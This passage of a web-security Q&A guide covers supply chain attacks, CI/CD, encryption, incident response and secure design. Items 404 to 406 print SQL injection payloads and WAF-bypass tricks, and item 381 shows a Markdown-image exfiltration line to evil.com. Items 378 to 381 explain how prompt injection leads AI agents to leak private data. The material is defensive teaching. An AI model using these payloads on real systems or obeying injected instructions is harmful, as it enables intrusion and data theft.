The client sends an `Idempotency-Key` header with a unique value per operation. The server stores the key with the request hash and the result. If the same key comes again, it returns the stored result instead of charging again. If the same key comes with a different body, it returns an error. The key should be scoped per user and kept for a set time. This prevents double charges from retries and some race-condition abuse.

## 338: How would you threat model a password reset feature?

Using STRIDE as a guide:

- Spoofing: can someone request a reset for another user and get the link? (Link sent only to the verified email.)
- Tampering: can the token or user ID in the link be changed? (Random token, look up user by token hash.)
- Repudiation: do we log resets and notify the user?
- Information disclosure: does the response reveal if the email exists? Does the token leak through `Referer` or logs?
- Denial of service: can someone flood a user with reset emails? (Rate limit per email and IP.)
- Elevation of privilege: can the reset bypass MFA? (Require MFA after reset or for admins.)

Also check `Host` header injection in the link and token expiry.

## 339: How do you secure account recovery when the user has lost their MFA device?

Account recovery is often the weakest part of authentication, since attackers target it instead of the strong login. Options:

- One-time recovery codes given during MFA setup.
- Allow several MFA methods or passkeys, so losing one is not a problem.
- For high-value accounts, recovery through identity verification with a waiting period and notifications to all known contacts.
- Do not let support staff disable MFA based only on a phone call. Many breaches, including big ones in 2023, started with help desk social engineering.

## 340: What is session riding through a browser extension, and can a web app defend against it?

A malicious or compromised browser extension with access to your site can read the DOM, cookies (with the right permissions, including `HttpOnly` ones through the cookies API) and make requests as the user. Web apps cannot fully defend against code running with more privileges in the browser. You can reduce impact with short sessions, step-up authentication for sensitive actions, server-side anomaly detection, and device-bound credentials. Assume an attacker on the client is possible and protect the most dangerous actions on the server.

## 341: How would you secure a Next.js app against common OWASP risks?

- Check authorization inside every Server Action and Route Handler, since they are public endpoints, not just functions.
- Do not rely only on middleware for auth. CVE-2025-29927 let attackers skip Next.js middleware with the `x-middleware-subrequest` header.
- Validate Server Action arguments with a schema.
- Keep secrets in server-only modules and mark them with the `server-only` package.
- Do not pass full database objects to Client Components, since props are serialized to the browser.
- Use a nonce-based CSP through middleware or the config.
- Configure `images.remotePatterns` tightly, since the image optimizer fetches remote URLs.

## 342: Why are Server Actions and similar RPC features a common source of access control bugs?

They look like normal functions in the code, so developers forget they are public HTTP endpoints. Anyone can call them with any arguments by sending the right request, even if the UI never shows the button. Every Server Action needs its own authentication, authorization and input validation, the same as an API route.

```ts
"use server";
export async function deletePost(id: string) {
  const user = await getCurrentUser();
  if (!user) throw new Error("Unauthorized");
  const post = await db.post.findUnique({ where: { id } });
  if (post?.authorId !== user.id) throw new Error("Forbidden");
  await db.post.delete({ where: { id } });
}
```

## 343: What were the React Server Components vulnerabilities in late 2025, and what lessons do they teach?

In December 2025, a critical RCE was disclosed in how React Server Components decode requests sent to server functions (known as "React2Shell", CVE-2025-55182), affecting React 19 RSC packages and frameworks built on them like Next.js. A crafted request could run code on the server without authentication. Follow-up issues allowed DoS and source code exposure. The lessons: framework-level deserialization is high-risk attack surface, "it's just a function call" hides a network protocol, and you need a fast patching process for framework updates, since exploitation started within days.

## 344: How do you handle a critical vulnerability in a framework you use, like Log4Shell or React2Shell?

1. Find out quickly where you use it: SBOMs and dependency inventories help a lot here.
2. Check if you are affected by version and configuration.
3. Apply the patch, or a workaround like a WAF rule if patching takes time.
4. Look at logs for signs of exploitation since before the disclosure.
5. If exploitation is possible, assume compromise of affected hosts: rotate secrets they had access to.
6. Communicate status to stakeholders.
7. Afterward, review how long each step took and improve the process.

## 345: How did the 2025 npm worms (like Shai-Hulud) work, and how do you defend against them?

In September 2025, attackers phished npm maintainers and published malicious versions of popular packages. The Shai-Hulud worm then spread itself: when installed, its script searched the machine and CI environment for npm tokens, GitHub tokens and cloud credentials, used stolen npm tokens to publish infected versions of the victim's own packages, and leaked secrets to public GitHub repos. A second wave hit in November 2025.

Defenses:

- Do not run install scripts by default.
- Delay adopting newly published versions (pnpm `minimumReleaseAge`, Renovate `minimumReleaseAge`).
- Use npm trusted publishing instead of long-lived tokens, and enable 2FA with phishing-resistant methods for maintainers.
- Keep CI credentials short-lived and scoped.
- Use lock files and `npm ci`.

## 346: What is npm trusted publishing and package provenance?

Trusted publishing lets a CI workflow (GitHub Actions or GitLab CI) publish to npm using a short-lived OIDC token instead of a stored npm token. There is no long-lived secret to steal. Provenance attaches a signed statement saying which repository, commit and workflow built the package, recorded in the Sigstore transparency log. Consumers can check it with `npm audit signatures`. npm has been moving toward requiring these methods and tightening classic token rules after the 2025 attacks.

## 347: What is SLSA?

SLSA (Supply-chain Levels for Software Artifacts) is a framework for build integrity. It defines levels for how builds are done:

- Build L1: provenance exists showing how the artifact was built.
- Build L2: builds run on a hosted build service and provenance is signed.
- Build L3: the build platform is hardened so builds are isolated and provenance cannot be faked by the build itself.

It helps consumers check that an artifact was built from the expected source by the expected process, which protects against tampered builds.

## 348: What is Sigstore and how does keyless signing work?

Sigstore is a set of open source tools for signing software. With keyless signing, the signer logs in with an OIDC identity (like a GitHub Actions workflow), Fulcio issues a short-lived certificate tied to that identity, the artifact is signed, and the signature is recorded in the Rekor transparency log. Verifiers check that the signature was made by a specific identity, such as "this repo's release workflow on the main branch". There are no long-lived signing keys to protect.

```bash
cosign verify ghcr.io/acme/app:1.4.0 \
  --certificate-identity-regexp 'https://github.com/acme/app/.github/workflows/release.yml@refs/tags/.*' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

## 349: What was the xz Utils backdoor and what does it teach about supply chain security?

In 2024, a backdoor was found in xz Utils versions 5.6.0 and 5.6.1, a compression library used by many Linux systems. An attacker spent about two years earning trust as a co-maintainer, then hid malicious code in test files and the release tarball (not in the Git source) that targeted SSH servers through systemd. A Microsoft engineer found it by noticing SSH logins were slightly slower. Lessons: maintainer burnout is a security risk, release artifacts can differ from source, and reproducible builds and source-to-artifact checks matter.

## 350: What are reproducible builds and why do they matter?

A reproducible build gives the exact same output bytes every time it is built from the same source with the same tools. Anyone can rebuild an artifact and compare hashes to confirm it was not changed during the build. This catches compromised build servers and tarballs that differ from the source, like in the xz case. It requires removing timestamps, fixing file ordering, pinning toolchain versions and so on.

## 351: How do you decide whether to add a new dependency from a security point of view?

Check:

- Is it maintained? Recent commits, issue responses, more than one maintainer.
- How many transitive dependencies does it bring in?
- Does it have install scripts?
- Is it widely used, and does it have known vulnerabilities or a history of them?
- Does it publish with provenance?
- Could you write the needed part yourself in a few lines?
- What permissions does it need (network, file system, child processes)?

Tools like OpenSSF Scorecard and Socket give quick risk signals. A tiny helper that pulls in 40 packages is often not worth it.

## 352: What is OpenSSF Scorecard?

Scorecard is an automated tool from the Open Source Security Foundation that checks a project's security practices and gives a score from 0 to 10. Checks include branch protection, code review, pinned dependencies, signed releases, dangerous workflow patterns, token permissions and whether the project uses fuzzing or SAST. You can run it on your own repos as a GitHub Action, or look up scores for dependencies.

## 353: How would you harden a CI/CD pipeline end to end?

- Protect the main branch: required reviews, required status checks, no force pushes.
- Run untrusted PR code with no secrets and read-only tokens.
- Pin third-party actions and images by SHA or digest.
- Use OIDC for cloud access and short-lived credentials.
- Separate build and deploy, with approvals on production environments.
- Generate provenance and sign artifacts, and verify signatures at deploy time.
- Use ephemeral, isolated runners, and do not run self-hosted runners for public repos.
- Log pipeline changes and alert on workflow file changes.

The OWASP Top 10 CI/CD Security Risks list is a good checklist.

## 354: What is the OWASP Top 10 CI/CD Security Risks?

It is an OWASP list of the main risks in CI/CD systems:

1. Insufficient Flow Control Mechanisms
2. Inadequate Identity and Access Management
3. Dependency Chain Abuse
4. Poisoned Pipeline Execution (PPE)
5. Insufficient PBAC (Pipeline-Based Access Controls)
6. Insufficient Credential Hygiene
7. Insecure System Configuration
8. Ungoverned Usage of 3rd Party Services
9. Improper Artifact Integrity Validation
10. Insufficient Logging and Visibility

## 355: What is poisoned pipeline execution?

Poisoned pipeline execution happens when an attacker can change what a CI pipeline runs, by editing the pipeline file itself (direct PPE) or files the pipeline uses like a Makefile, test script or `package.json` scripts (indirect PPE). If the pipeline runs with secrets on code from an untrusted branch or PR, the attacker's code runs with those secrets. Defenses: do not give secrets to untrusted code, require review for pipeline files (CODEOWNERS), and run privileged jobs only from protected branches.

## 356: Why are self-hosted CI runners on public repositories dangerous?

Anyone can open a pull request, and if workflows run on PRs, their code runs on your self-hosted machine. Self-hosted runners are often persistent, so the attacker can leave a backdoor that affects later jobs, steal secrets from other workflows, or move into your internal network. GitHub recommends not using self-hosted runners with public repositories, or using ephemeral, isolated runners that are destroyed after each job.

## 357: How would you protect a production deploy from a compromised developer account?

- Require code review from someone else for every change to main (so one account cannot ship alone).
- Require signed commits or verified identities.
- Require phishing-resistant MFA for all source control and CI accounts.
- Deploy only from CI, never from laptops, using credentials developers do not hold.
- Use environment protection rules with required approvers for production.
- Alert on unusual activity: new SSH keys, new tokens, changes to branch protection.

## 358: How do you design secrets management for a large system?

- One central secrets manager with fine-grained access policies.
- Workload identity (IAM roles, Kubernetes service accounts, SPIFFE) so services get secrets without having a "secret to get secrets".
- Dynamic secrets where possible, like short-lived database credentials created per service by Vault.
- Automatic rotation with zero-downtime support (two valid versions during rotation).
- Audit logs of every secret access.
- Secret scanning across code, logs, tickets and chat to catch leaks.

## 359: What is envelope encryption?

Envelope encryption uses two levels of keys. Each piece of data is encrypted with its own data key (DEK). The data key is then encrypted with a key encryption key (KEK) that lives in a KMS or HSM and never leaves it. You store the encrypted data and the encrypted DEK together. To decrypt, you ask KMS to decrypt the DEK, then decrypt the data locally. Rotating the KEK only requires re-encrypting the small DEKs, not all the data. AWS KMS, Google Cloud KMS and Azure Key Vault all work this way.

## 360: How do you rotate encryption keys for data already stored?

Store a key version with each encrypted value. When you rotate:

1. Create the new key and make it the default for new encryptions.
2. Keep old keys available for decryption.
3. Re-encrypt existing data in the background (read with the old key, write with the new one), or lazily when records are next updated.
4. Once no data uses the old key, disable and later delete it.

With envelope encryption, rotating the master key often only means re-wrapping data keys.

## 361: How do you search on encrypted fields?

You cannot search normally on randomized encryption like AES-GCM. Common options:

- Blind index: store an HMAC of the normalized value (like a lowercased email) next to the ciphertext, and search by the HMAC. It supports exact match only and leaks which records share a value.
- Deterministic encryption: same input gives the same ciphertext, allowing equality searches, with the same leakage.
- Database features like MongoDB Queryable Encryption, which supports equality and range queries on encrypted fields.

Choose based on which queries you need and how much leakage is acceptable.

## 362: What is the difference between a KMS and an HSM?

An HSM (Hardware Security Module) is a physical, tamper-resistant device that stores keys and does crypto operations inside it, so keys never leave in plain form. A KMS (Key Management Service) is a managed service, like AWS KMS, that handles key storage, access policies, rotation and audit, and is usually backed by HSMs. Most apps use a KMS. Dedicated HSMs (like AWS CloudHSM) are used when regulations require exclusive control of the hardware.

## 363: What is post-quantum cryptography and should web developers care now?

Large quantum computers could break RSA and elliptic curve crypto. Post-quantum algorithms resist that. NIST published standards in 2024: ML-KEM (key exchange), ML-DSA and SLH-DSA (signatures). Browsers and CDNs already use hybrid key exchange (X25519MLKEM768) in TLS 1.3 by default, which protects against "harvest now, decrypt later" recording of traffic. Most web developers do not need to change app code yet, but should keep TLS libraries and servers updated and track which systems use long-lived RSA or ECC keys.

## 364: How do padding oracle attacks work?

In CBC mode without authentication, if the server reveals whether decrypted data had valid padding (through different errors or timing), an attacker can modify ciphertext byte by byte and use those responses to decrypt the data, and even encrypt their own data, without the key. It broke many systems, including old ASP.NET versions. The fix is authenticated encryption like AES-GCM, or encrypt-then-MAC with a constant-time check before decrypting.

## 365: Why is it dangerous to reuse a nonce with AES-GCM?

GCM is a stream cipher mode. With the same key and nonce, two messages are encrypted with the same keystream, so XORing the ciphertexts gives the XOR of the plaintexts. Worse, reuse lets an attacker recover the authentication key and forge messages. With random 96-bit nonces, rotate keys before about 2^32 messages per key to keep collision risk low. For very high volumes, use AES-GCM-SIV or XChaCha20-Poly1305, which handle nonces more safely.

## 366: How would you implement field-level encryption for personal data in a Node.js app?

- Use envelope encryption with a KMS: a data key per tenant or per table, wrapped by a KMS key.
- Encrypt sensitive fields (like national ID, date of birth) with AES-256-GCM before writing to the database, and use the record ID as additional authenticated data (AAD) so ciphertext cannot be moved to another record.
- Store key version with each value.
- Add a blind index for fields that need exact-match search.
- Decrypt only in the service that needs the plain value, and keep it out of logs.

```js
const cipher = crypto.createCipheriv("aes-256-gcm", dataKey, iv);
cipher.setAAD(Buffer.from(recordId));
```

## 367: How do you design logging so it stays useful during an incident?

- Use structured logs (JSON) with consistent field names across services.
- Add correlation IDs that follow a request through all services.
- Include who (user, client, IP), what (action, resource), when (UTC timestamp) and result.
- Ship logs off the host quickly to a central store, so an attacker on the host cannot delete them.
- Make security logs append-only or write-once, with retention long enough for investigations (often months).
- Sync clocks with NTP.
- Test that you can actually answer "what did this user do in the last 30 days?".

## 368: How do you make logs tamper-evident?

- Send them to a separate system the app servers cannot modify, like a SIEM or a bucket with object lock (WORM).
- Use hash chaining, where each entry includes a hash of the previous one, so removing or editing entries breaks the chain.
- Sign log batches periodically.
- Alert on gaps in log streams, since attackers often turn logging off.

Cloud audit logs like AWS CloudTrail have built-in integrity validation using digest files.

## 369: What is detection engineering for a web app?

It is building and maintaining specific detections for attacks against your app, based on its logs and what attackers actually do. For example: an alert when one IP tries many different user IDs on `/orders/:id` (IDOR enumeration), when an account logs in from two countries within an hour, or when a role changes outside the admin UI. Detections are written as code, tested with sample data, tuned to reduce noise, and linked to response runbooks.

## 370: How do you balance security logging with privacy laws like GDPR?

- Log what you need for security, and avoid extra personal data.
- Use pseudonymous user IDs instead of emails or names where possible.
- Mask or truncate IPs if full IPs are not needed for your use case.
- Set and enforce retention periods.
- Restrict who can access logs and audit that access.
- Document the legitimate interest for security logging in your privacy records.

Security logging is generally allowed under GDPR, but it still has to follow data minimization.

## 371: What are the phases of incident response?

A common model (from NIST SP 800-61) is:

1. Preparation: plans, tools, contacts, training.
2. Detection and analysis: notice something, confirm it is an incident, judge its scope.
3. Containment: stop it from spreading (disable accounts, isolate hosts, block IPs).
4. Eradication: remove the cause (patch, remove malware, rotate secrets).
5. Recovery: restore systems and watch for return.
6. Post-incident review: what happened, what went well, what to improve, without blame.

NIST updated 800-61 in 2025 to align it with the Cybersecurity Framework 2.0, but these steps are still the core.

## 372: You find an attacker's web shell on one of your servers. What do you do?

1. Do not just delete it. First preserve evidence: take a disk and memory snapshot if possible.
2. Isolate the server from the network, or move it to a quarantine security group, without shutting it down if you need memory evidence.
3. Find how it got there (logs, file timestamps, vulnerable component) and check other servers for the same.
4. Assume any secrets on the server are compromised and rotate them.
5. Rebuild the server from a known good image instead of cleaning it.
6. Patch the entry point.
7. Look for lateral movement and data access.
8. Follow your notification duties (legal, customers, regulators).

## 373: How do you handle a leaked database backup?

- Find out exactly what data was in it and how it leaked.
- Close the leak (bucket permissions, access keys).
- Check access logs to see who downloaded it.
- If passwords were inside, check how they were hashed. Force resets if hashes were weak, and consider it even for strong hashes.
- Rotate any secrets or tokens stored in the database.
- Involve legal: data protection laws like GDPR require notifying the regulator within 72 hours if personal data is at risk, and affected users in serious cases.
- Encrypt backups and restrict access going forward.

## 374: What is the difference between a vulnerability disclosure program and a bug bounty?

A VDP gives researchers a safe, legal way to report issues, with a clear scope and a promise not to take legal action against good-faith research, but no payment. A bug bounty adds payments for valid findings. Every public-facing organization should have a VDP (and `security.txt`). A bug bounty makes sense once you can handle the volume of reports and fix issues quickly.

## 375: How would you prioritize a backlog of 500 vulnerability findings?

Do not just sort by CVSS. Consider:

- Is it reachable? A vulnerable function that your code never calls matters less.
- Is it exposed to the internet or only internal?
- Is it being exploited in the wild? Check CISA's Known Exploited Vulnerabilities (KEV) list and EPSS scores.
- What data or systems does the affected app touch?
- How easy is the fix?

Fix exploited and internet-facing criticals first. Group findings by root cause, like one base image update that fixes 200 container CVEs.

## 376: What is EPSS?

EPSS (Exploit Prediction Scoring System) gives each CVE a probability, from 0 to 1, that it will be exploited in the next 30 days, based on real exploit data and vulnerability features. CVSS says how bad a bug would be, EPSS says how likely it is to be used. Combining both, plus the KEV list, gives much better prioritization than CVSS alone.

## 377: What is reachability analysis in SCA tools?

Reachability analysis checks whether your code actually calls the vulnerable function in a dependency. A library might have a CVE in a feature you never use. Tools like Snyk, Semgrep Supply Chain, Endor Labs and GitHub's own analysis can mark findings as reachable or not, which can cut the number of urgent fixes a lot. It is not perfect with dynamic code, so unreachable findings still need updating eventually.

## 378: How do you secure an application that uses an LLM with tools (an AI agent)?

- Treat all model output as untrusted input: validate and encode it before using it in HTML, SQL, shell or API calls.
- Give the agent the fewest tools and narrowest permissions possible.
- Run tools with the user's permissions, not a superuser service account.
- Require user confirmation for actions with side effects (sending emails, payments, deletes).
- Assume any content the model reads (web pages, emails, documents) can contain prompt injection.
- Limit network access, so injected instructions cannot easily send data out.
- Log tool calls and set limits on cost and number of calls.

## 379: Why can't you fully fix prompt injection with a better system prompt?

The model receives instructions and data in the same channel, natural language, and has no reliable way to tell them apart. Any instruction in the system prompt like "never follow instructions in documents" can be undone by clever text in a document. Filters and classifiers reduce it, but attackers keep finding new phrasings. So the design must assume injection will sometimes work, and limit what a compromised model can do, the same way you would limit a compromised account.

## 380: What is the lethal trifecta for AI agents?

The term (from Simon Willison) describes an agent that has all three of:

1. Access to private data.
2. Exposure to untrusted content (web pages, emails, issues).
3. A way to send data out (web requests, emails, links, images).

With all three, a prompt injection in the untrusted content can make the agent read private data and leak it. The safest fix is to remove at least one of the three for any given task.

## 381: How can an LLM chat UI leak data through Markdown images?

If the app renders Markdown from the model and the model can be tricked by prompt injection, it can output `![x](https://evil.com/log?data=SECRET)`. The browser loads the image automatically and sends the secret to the attacker's server, with no click needed. Defenses: do not render images from arbitrary domains, use a CSP `img-src` allowlist, proxy images through a server that blocks unknown hosts, and treat links from the model as untrusted.

## 382: How do you test an application for access control bugs at scale?

- Write automated tests for each endpoint with several users: owner, other user in the same tenant, user in another tenant, unauthenticated, admin.
- Use a matrix of roles and actions from your authorization design, and test each cell.
- Use Burp extensions like Autorize or AuthMatrix, which replay every request with another user's session and compare responses.
- Add a test that fails if a new route is added without being in the authorization config.
- Log and alert on 403s in production to catch attempts.

## 383: What is GraphQL introspection abuse and is disabling introspection enough?

Introspection lets clients query the full schema, which helps attackers find hidden mutations and fields. Disabling it in production is reasonable for private APIs, but not enough: tools like Clairvoyance can rebuild much of the schema from error messages that suggest field names ("Did you mean...?"), and the frontend bundle often contains the queries. Treat the schema as known, and make every field secure on its own. Also turn off field suggestions in production.

## 384: How do you protect a GraphQL API from resource exhaustion?

- Depth limiting (for example max 7 levels).
- Query cost analysis: give each field a cost, multiply by list sizes, and reject queries above a budget.
- Require pagination arguments with a maximum page size.
- Limit aliases, directives and batched operations.
- Use persisted queries (allowlisted query IDs) for your own clients, and reject arbitrary queries.
- Use DataLoader to avoid N+1 queries.
- Set execution timeouts.

## 385: What are the security concerns with server-side rendering?

- Data passed from server to client (props, initial state) is visible in the HTML, so do not include secrets or other users' data.
- Embedding JSON in `<script>` tags needs proper escaping to avoid XSS.
- Cache-sharing bugs: if a server-rendered page with user data is cached by a CDN, other users may see it.
- Module-level variables are shared between requests in Node.js, so storing per-user data in them leaks it across users.
- SSR servers can fetch URLs, so they can be SSRF entry points.

## 386: How can a module-level variable cause a data leak in a Node.js server?

Modules are loaded once and shared by all requests. If you store request data in a module variable, two users' requests can mix.

```js
// Bug: shared across all requests
let currentUser;

app.use((req, res, next) => {
  currentUser = req.user;
  next();
});

app.get("/me", async (req, res) => {
  await somethingAsync();
  res.json(currentUser); // may be another user by now
});
```

Use `req`, function arguments or `AsyncLocalStorage` for per-request data.

## 387: How do you secure server-to-server calls to third-party APIs?

- Use TLS with certificate verification on (never `rejectUnauthorized: false` in production).
- Store API credentials in a secrets manager, with the narrowest scopes.
- Set timeouts and retry limits so a slow partner does not take your app down.
- Validate responses with a schema.
- Do not follow redirects to unexpected hosts.
- Log calls (without credentials) for auditing.
- Use separate credentials per environment.

## 388: What is certificate pinning and why is it less common now?

Certificate pinning means an app only trusts a specific certificate or public key for a server, not any certificate signed by a trusted CA. It protects against compromised CAs and some MITM setups. But it is risky: if you rotate keys or your CA changes without updating the pins, your app stops working. HTTP Public Key Pinning (HPKP) for browsers was removed for this reason. Pinning is still used in some mobile apps, while the web relies on Certificate Transparency instead.

## 389: What is Certificate Transparency?

Certificate Transparency (CT) requires CAs to log every certificate they issue in public, append-only logs. Browsers reject certificates without proof of being logged. Domain owners can monitor CT logs (with tools like crt.sh or alerts from Cloudflare or Facebook's CT monitor) to see if someone got a certificate for their domain without permission. It also helps attackers find subdomains, so do not assume a subdomain is secret.

## 390: How would you design rate limiting for a distributed system?

- Use a shared store like Redis with atomic operations (Lua scripts or `INCR` with `EXPIRE`) so all instances see the same counts.
- Choose an algorithm: fixed window is simple but bursty, sliding window and token bucket are smoother.
- Apply limits at several levels: per IP, per user, per API key, per endpoint, with tighter limits on login and expensive operations.
- Put basic limits at the edge (CDN or gateway) to stop floods before they reach the app.
- Decide what happens if Redis is down: fail open for general traffic, fail closed for login and sensitive flows.
- Return `429` with `Retry-After` and rate limit headers.

## 391: How do attackers bypass IP-based rate limiting, and how do you respond?

Attackers use botnets, residential proxy networks, cloud IP ranges and IPv6 (a single user can have billions of addresses). They also spoof `X-Forwarded-For` if the app trusts it blindly. Responses:

- Rate limit by account, device fingerprint and other signals, not only IP.
- Group IPv6 by /64 prefix.
- Only trust forwarding headers from your own proxies.
- Use bot detection services and behavior signals.
- Make the attack less valuable with MFA and breached-password checks.

## 392: Why is trusting X-Forwarded-For dangerous?

Clients can set `X-Forwarded-For` to anything. If your app uses it directly for rate limiting, logging or IP allowlists, an attacker can fake any IP. Only take the IP from the hop added by your own trusted proxy. In Express, set `trust proxy` to the exact number of proxies or their IP ranges, not `true`.

```js
app.set("trust proxy", 1); // exactly one proxy in front
```

## 393: How do you safely implement "login as user" (impersonation) for support staff?

- Only specific roles can impersonate, with step-up authentication.
- Require a reason, and log start, end and every action taken during impersonation.
- Show a clear banner during impersonation.
- Block the most sensitive actions (changing password, MFA, payment methods, viewing secrets).
- Keep the real admin identity in the session alongside the impersonated user, so logs show both.
- Time-limit the session.
- Optionally notify the user or require their consent.

## 394: What is the difference between authorization at the API layer and at the data layer?

API-layer checks happen in route handlers or middleware: "can this user call `DELETE /posts/:id` for this post?". Data-layer checks are built into how data is fetched: queries are always scoped, or the database enforces it with row-level security. API-layer checks are flexible but easy to forget on a new route. Data-layer checks are harder to bypass but less flexible. Strong designs use both, so a missing check in one layer is caught by the other.

## 395: How do you prevent privilege escalation through role management features?

- A user can only grant roles at or below their own level, and never to themselves.
- Role changes require step-up authentication and are logged.
- The last admin cannot be removed or demoted.
- Invitation links bind the role on the server, not in a URL parameter.
- Role assignment APIs check the assigner's permission and the target role, not just "is admin".

## 396: What are common pitfalls with SAML-based single sign-on?

- XML signature wrapping: the attacker adds an unsigned assertion while keeping a signed one, and the app reads the unsigned one.
- Not checking that the assertion is signed at all, or accepting signatures from any certificate.
- Not checking `Audience`, `Recipient`, `NotOnOrAfter` and `InResponseTo`, which allows replay.
- XXE in the XML parser.
- Comment injection in the NameID that causes different libraries to read different usernames.

Use a well-maintained SAML library, keep it updated, and do not write your own XML signature validation.

## 397: What is account takeover through OAuth account linking?

If your app links a social login to an existing account just because the email matches, an attacker can create an account at an identity provider with the victim's email (on a provider that does not verify emails), log in to your app, and get access to the victim's account. Only link accounts automatically when the provider says the email is verified and you trust that provider, or require the user to log in to the existing account first to link.

## 398: How do you prevent pre-account takeover?

In a pre-account takeover, the attacker signs up with the victim's email before the victim does, for example with a password, and the account is never verified. Later, the victim signs up with "Sign in with Google" and the app merges into the existing account, which the attacker still has a password for. Defenses: require email verification before an account is usable, and when merging, remove other unverified login methods or ask the user to confirm.

## 399: How would you secure a public file sharing link feature?

- Use long random tokens (at least 128 bits) in the link, not sequential IDs.
- Let owners set expiry, revoke links, and optionally require a password or sign-in.
- Rate limit link access to stop guessing.
- Serve files with `Content-Disposition: attachment` from a separate domain.
- Use `Referrer-Policy: no-referrer` on shared pages so the token does not leak to other sites.
- Log access, and show the owner who opened the link if possible.
- Use short-lived signed URLs from the storage service for the actual download.

## 400: What are pre-signed URLs and what are their risks?

Pre-signed URLs (S3, GCS, Azure SAS) give temporary access to a specific object without credentials, by including a signature and expiry in the URL. Risks: anyone with the URL has access until expiry, URLs leak through logs, referrers and chat, and long expiry times make leaks worse. For uploads, a pre-signed `PUT` URL might allow any file type or size unless you add conditions. Keep expiry short, scope to one object, and use POST policies to restrict content type and size.

## 401: How do you secure Kubernetes workloads running a web app?

- Run containers as non-root with a read-only root filesystem and dropped capabilities.
- Apply Pod Security Standards at the `restricted` level.
- Use network policies so pods can only talk to what they need, with a default deny.
- Give each workload its own service account with minimal RBAC, and turn off automatic token mounting when not needed.
- Keep secrets in an external secrets manager, or at least enable encryption at rest for Kubernetes Secrets.
- Scan images and only allow signed images from trusted registries with an admission controller.
- Keep the cluster and nodes patched.

## 402: How does an SSRF in a Kubernetes pod become a cluster compromise?

From inside a pod, SSRF can reach the Kubernetes API server, the kubelet API on the node, internal services without authentication, and the cloud metadata service. If the pod's service account token has broad permissions, the attacker can create privileged pods and take over the node. If metadata is reachable, they get the node's cloud role. Defenses: network policies blocking metadata and the API server, minimal service account permissions, IMDSv2 with hop limit 1, and workload identity instead of node roles.

## 403: What is the difference between a WAF and RASP?

A WAF sits in front of the app and looks at HTTP traffic from the outside. It does not know how the app uses each input, so it relies on patterns and can be bypassed with encoding tricks.

RASP (Runtime Application Self-Protection) runs inside the app, hooking into things like database drivers, file access and child processes. It can see that a query was actually changed by user input and block it. It is more accurate but adds overhead and depends on support for your language.

## 404: How do attackers bypass WAFs, and what does that mean for defense?

Common bypasses: different encodings (double URL encoding, Unicode), case changes, comments inside SQL keywords, unusual content types (JSON or multipart where the WAF only checks form data), HTTP parameter pollution, very large bodies the WAF does not fully inspect, and request smuggling. The lesson is that a WAF buys time and blocks automated noise, but the real fix is in the code. Treat WAF rules as virtual patches with a deadline to fix the underlying bug.

## 405: What is second-order SQL injection?

In second-order SQL injection, the payload is stored safely first (with a parameterized query), but later read from the database and used unsafely in another query, because developers trust data that came from their own database. For example, a username `admin'--` is saved fine, but a later "change password" function builds `UPDATE users SET password = '...' WHERE username = '${row.username}'`. The fix is the same: parameterize every query, no matter where the data comes from.

## 406: How does blind SQL injection work?

In blind SQL injection, the app does not show query results or errors, but the attacker can still learn data by asking yes/no questions:

- Boolean-based: `' AND SUBSTRING(password,1,1)='a' --` and seeing if the page changes.
- Time-based: `' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --` and measuring response time.
- Out-of-band: making the database send a DNS or HTTP request to the attacker's server.

Tools like sqlmap automate it. It is slower but still gives full data access, which is why "we don't show errors" is not a defense.

## 407: How do you design an app so injection bugs are unlikely in the first place?

- Use APIs that keep code and data separate: query builders, ORMs, `execFile` instead of shells, template engines with auto-escaping, DOM APIs like `textContent`.
- Ban the unsafe versions with linters (ESLint rules, Semgrep rules for `$queryRawUnsafe`, `exec`, `innerHTML`).
- Use typed, validated input at the edge.
- Use Trusted Types and strict CSP in the browser.
- Make the safe way the easy way in your shared libraries, so developers do not need to remember to escape.

This is the "secure by default" approach Google and CISA push for.

## 408: What is a secure-by-design and secure-by-default approach?

Secure by design means security is part of the design from the start, not added after. Secure by default means the product is safe out of the box without the user changing settings: MFA on, no default passwords, logging enabled, unsafe features off. CISA's Secure by Design pledge asks vendors to take ownership of customer security outcomes, remove whole classes of bugs (like moving to memory-safe languages and parameterized queries everywhere), and be open about vulnerabilities.

## 409: How do you securely handle the deserialization of JSON into class instances?

JSON itself does not run code, but problems appear when you turn it into objects:

- Libraries that use type hints in the JSON (like `"@type"` in Java's Jackson with default typing, or `"$type"` in .NET's Json.NET with `TypeNameHandling`) can create dangerous classes.
- Merging JSON into existing objects can cause prototype pollution in JavaScript.
- Huge or deeply nested JSON can cause DoS.

Validate the shape with a schema (Zod, JSON Schema), build objects explicitly from the validated data, and limit size and depth.

## 410: What is a gadget chain in deserialization attacks?

A gadget chain is a sequence of existing classes in the app or its libraries whose normal methods, when called in a specific order during deserialization, end up doing something dangerous like running a command. The attacker does not upload new code, they only craft serialized data that links these "gadgets". Tools like ysoserial collect known chains for Java. This is why removing the obviously dangerous class is not enough. You must avoid deserializing untrusted data with formats that create arbitrary types.

## 411: How do you approach security for a monolith being split into microservices?

- Map trust boundaries again: calls that were function calls are now network calls that can be reached by other things.
- Decide where authentication and authorization happen for each service.
- Add service identity (mTLS, workload identity) so services know who is calling.
- Avoid shared databases where one service can read another's sensitive tables.
- Centralize logging with correlation IDs before splitting further.
- Watch out for internal endpoints that "only other services call" but have no authentication.
- Keep an inventory of services and their APIs.

## 412: How would you secure a webhook delivery system that sends events to customer URLs?

You are now making requests to URLs customers control, which is an SSRF risk:

- Resolve and validate destination IPs, blocking private and metadata ranges, on every delivery.
- Send from an isolated network with no internal access.
- Do not follow redirects.
- Sign each payload with a per-customer secret and timestamp.
- Use timeouts, retries with backoff and a maximum payload size.
- Do not include more data than needed, and let customers rotate secrets.
- Do not show the full response body back to the customer, since it can leak internal data if SSRF slips through.

## 413: What are the security trade-offs of storing sessions in Redis vs signed cookies?

Redis sessions: the cookie holds only a random ID, data stays on the server, and you can revoke sessions instantly. But you need Redis to be available and protected (auth, TLS, not exposed to the internet).

Signed (or encrypted) cookie sessions: no server storage and easy scaling. But the data is on the client (signed cookies can be read, only encrypted ones hide it), size is limited, and you cannot revoke one session before expiry without extra server state. If the signing key leaks, attackers can create any session.

## 414: How would you migrate a large app from session cookies to passkeys?

1. Add WebAuthn registration for logged-in users as an optional second factor, then as a password replacement.
2. Use conditional UI (autofill) on the login form, so users with passkeys can pick them easily.
3. Keep passwords as a fallback at first, and track adoption.
4. Make account recovery strong, since it becomes the weak point.
5. Support multiple passkeys per account and synced passkeys from platform providers.
6. Over time, let users remove their password, and require passkeys for admins.

